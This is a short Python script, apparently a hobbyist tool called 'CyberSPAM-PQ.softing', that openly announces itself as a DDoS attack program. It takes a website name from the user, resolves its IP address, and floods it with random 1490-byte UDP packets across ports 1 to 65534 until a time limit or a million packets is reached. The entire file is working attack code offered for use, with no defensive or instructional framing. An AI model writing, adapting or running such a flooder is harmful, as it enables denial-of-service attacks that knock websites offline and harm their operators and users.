import sys
import os
import time
import socket
import random

os.system("clear")

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

mil = 0
mil = mil + 1000000
limit = 0
app = 0
port = 0

print('##########################################')
print ('Wellcome to CyberSPAM-PQ.softing')
print()
print ('DDoS Attack http://SITE')
print()
print('##########################################')
print()
print
site = input('Имя сайта: ')
ip = socket.gethostbyname(site)
print ('searching...')
time.sleep(1)
print ('Site IP: ',ip)
print()
print('##########################################')
print()

now = datetime.now()
hour = now.hour
minute = now.minute

print
limit = int(input('Time attack limit(minute): '))
stopminute = 0
stopminute = minute + limit
print('Stop site attack in: %s:%s'%(hour,stopminute))
print('Maximum: 1 000 000 packs')
print()
print('##########################################')

sent = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ibytes = random._urandom(1490)
while True:
            now = datetime.now()
            nowminute = now.minute
           ## print('Stop attack in %s:%s'%(hour,stopminute))
            port = port + 1
            sock.sendto(ibytes, (ip,port))
            sent = sent + 1
            stopattack = mil - sent 
            print('     [pack %s] remained %s'%(sent,stopattack),'Stop attack in %s:%s'%(hour,stopminute))
            
            if port == 65534:
                        port = 1
                        
            if nowminute == stopminute:
                        sys.exit()
                        
            if sent == mil:
                        break
